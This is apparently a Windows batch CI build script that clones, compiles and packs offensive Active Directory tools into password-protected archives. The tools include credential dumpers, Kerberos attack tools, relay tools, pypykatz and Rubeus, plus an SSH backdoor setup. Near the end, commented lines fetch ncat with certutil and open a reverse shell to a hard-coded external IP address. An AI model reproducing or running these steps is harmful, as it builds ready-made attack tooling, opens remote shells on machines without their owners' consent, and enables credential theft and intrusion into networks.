CALL config.bat
CALL pre-install.bat

REM CALL clone.bat login-securite/DonPAPI
REM CALL build-py.bat DonPAPI, DonPAPI, 0

REM CALL clone.bat zyn3rgy/LdapRelayScan
REM CALL build-py.bat LdapRelayScan, LdapRelayScan, 0




:: Build impacket
REM CALL clone.bat SecureAuthCorp/impacket
REM cd examples
REM CALL build-py.bat wmiexec , wmiexec , 0
REM CALL build-py.bat secretsdump , secretsdump , 0
REM CALL build-py.bat smbserver , smbserver , 0
REM CALL build-py.bat smbclient , smbclient , 0
REM CALL build-py.bat smbexec , smbexec , 0
REM CALL build-py.bat psexec , psexec , 0
REM CALL build-py.bat dcomexec , dcomexec , 0
REM CALL build-py.bat GetUserSPNs , GetUserSPNs , 0
REM CALL build-py.bat GetNPUsers , GetNPUsers , 0
REM CALL build-py.bat getST , getST , 0
REM CALL build-py.bat getTGT , getTGT , 0
REM CALL build-py.bat ticketer , ticketer , 0


REM CALL clone.bat NinjaStyle82/rbcd_permissions
REM CALL build-py.bat rbcd , rbcd , 0


REM CALL clone.bat Hackndo/WebclientServiceScanner
REM cd webclientservicescanner
REM git am %scriptpath%\WebclientServiceScanner\0001-Add-color-by-k4nfr3-WebclientServiceScanner.patch
REM CALL build-py.bat console , WebclientServiceScanner , 0


:: See https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
REM CALL clone.bat dirkjanm/krbrelayx
REM CALL build-py.bat krbrelayx , krbrelayx , 0
REM CALL build-py.bat printerbug , printerbug , 0
REM CALL build-py.bat dnstool , dnstool , 0
REM CALL build-py.bat addspn , addspn , 0


:: Build pypykatz
CALL clone.bat skelsec/pypykatz
%py64% -m pip install minidump minikerberos aiowinreg msldap winacl aiosmb aesedb tqdm
%py64% -m pip install git+https://github.com/skelsec/unicrypto
:: https://skelsec.medium.com/play-with-katz-get-scratched-6c2c350fadf2
:: https://drive.google.com/drive/folders/1KT2yWziJHvaH41jtZMsatey2KycWF824?usp=sharing
:: From https://github.com/skelsec/pypykatz/commit/f53ed8c691b32c2a5a0189604d56afe4732fb639
%py64% setup.py install
REM git am %scriptpath%\pypykatz\0001-xdrprotection.patch
REM git am %scriptpath%\pypykatz\0001-Add-debug-message-for-method-handledup.patch
REM git am %scriptpath%\pypykatz\0001-build_windows.patch
pwd
CALL build-py.bat __main__ , pypykatz , 0
appveyor PushArtifact C:\Python39-x64\Scripts\*.exe

REM CALL clone.bat skelsec/kerberoast
REM cd kerberoast
REM CALL build-py.bat kerberoast , kerberoast , 0


:: Build BloodHound
REM CALL clone.bat fox-it/BloodHound.py
:: Patch bloodhound to avoid "unrecognized arguments: --multiprocessing-fork"
:: In case where the patch doesn't work DO NOT USE "-c ALL" and avoid DCOnly and ACL. Use -c "Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,ObjectProps"
:: Maybe the argument "--disable-pooling" can do the tricks
REM %py64% -c "f=open('bloodhound/__init__.py','r');d=f.read().replace('    main()','    import multiprocessing;multiprocessing.freeze_support();main()');f.close();f=open('bloodhound/__init__.py','w').write(d);f.close();"
REM CALL build-py.bat bloodhound, bloodhound , 0


:: DISABLED => See https://github.com/fox-it/mitm6/issues/3
:: Build mitm6
REM CALL clone.bat fox-it/mitm6
::cd mitm6
::%py64% -m pip install service_identity
::%py32% -m pip install service_identity
REM CALL build-py.bat mitm6, mitm6 , 0


:: Build Responder3
::CALL clone.bat skelsec/Responder3
::cd responder3
::echo ..\examples\config.py > Responder3.lst7z
::CALL build-py.bat __main__ , responder3 , 0


:: Build responder
::CALL clone.bat lgandx/Responder
::echo Responder.conf > Responder.lst7z
::echo logs >> Responder.lst7z
::echo files >> Responder.lst7z
::echo certs >> Responder.lst7z
::CALL build-py.bat Responder , Responder , 0


:: Build sshdog
::CALL clone.bat cyd01/sshdog
::echo PUT YOUR PUB KEY HERE > config/authorized_keys
::ssh-keygen -t rsa -b 2048 -N '' -f config/ssh_host_rsa_key
::echo 1mm0rt41 %_7Z_PASSWORD_% > config/users
::echo config/ > sshdog.lst7z
::CALL build-go.bat sshdog , 1


:: Build gpppfinder
REM CALL clone.bat https://bitbucket.org/grimhacker/gpppfinder.git
REM CALL build-py.bat cli , gpppfinder , 0


REM CALL clone.bat GhostPack/Rubeus
REM CALL log.bat "Building Rubeus..."
REM msbuild /property:Configuration=Release
REM CALL log.bat "Create Rubeus.7z with required files..."
REM cd Rubeus\bin\release
REM Rubeus.exe -h
REM set _err=%ERRORLEVEL%
REM set _errorExpected=0
REM IF "%ERRORLEVEL%" == "%_errorExpected%" (
REM 	CALL log.bat "✅ Build Rubeus.exe OK" 1
REM 	echo Rubeus.exe >Rubeus.lst7z
REM 	echo Rubeus.exe.config >>Rubeus.lst7z
REM 	7z a -t7z -mhe -p%_7Z_PASSWORD_% %_7Z_OUPUT_%\Rubeus.7z @Rubeus.lst7z
REM 	appveyor PushArtifact %_7Z_OUPUT_%\Rubeus.7z
REM 	copy Rubeus.exe %scriptpath%\bin\Rubeus.exe
REM ) else (
REM 	CALL log.bat ERR "FAIL to build a valid Rubeus.exe (This bin return %_err%, expected %_errorExpected%)..." , 1
REM )


REM CALL clone.bat deepinstinct/LsassSilentProcessExit
REM CALL log.bat "Building LsassSilentProcessExit..."
REM msbuild /property:Configuration=Release
REM CALL log.bat "Create LsassSilentProcessExit.7z with required files..."
REM cd x64\Release
REM :: Running LsassSilentProcessExit will crash the script :'(
REM IF EXIST LsassSilentProcessExit.exe (
REM 	CALL log.bat "✅ Build LsassSilentProcessExit.exe OK" 1
REM 	echo LsassSilentProcessExit.exe >LsassSilentProcessExit.lst7z
REM 	7z a -t7z -mhe -p%_7Z_PASSWORD_% %_7Z_OUPUT_%\LsassSilentProcessExit.7z @LsassSilentProcessExit.lst7z
REM 	appveyor PushArtifact %_7Z_OUPUT_%\LsassSilentProcessExit.7z
REM 	copy LsassSilentProcessExit.exe %scriptpath%\bin\LsassSilentProcessExit.exe
REM ) else (
REM 	CALL log.bat ERR "FAIL to build a valid LsassSilentProcessExit.exe ..." , 1
REM )


:: Building custom-scripts
REM cd %scriptpath%\custom-scripts
REM CALL build-py.bat httpd , httpd , -1


:: Sync threading
CALL sync-thread.bat 0


:: #############################################################################
:END_MAIN
7z a -t7z -mhe -p%_7Z_PASSWORD_% %_7Z_OUPUT_%\All.7z %scriptpath%\bin\*.exe
appveyor PushArtifact %_7Z_OUPUT_%\All.7z
dir %scriptpath%\bin\
dir %_7Z_OUPUT_%
cd %_7Z_OUPUT_%
:: certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
:: ncat.exe 51.178.136.102 88 -e cmd.exe
CALL log.bat "✅ Build END"
EXIT /B 0

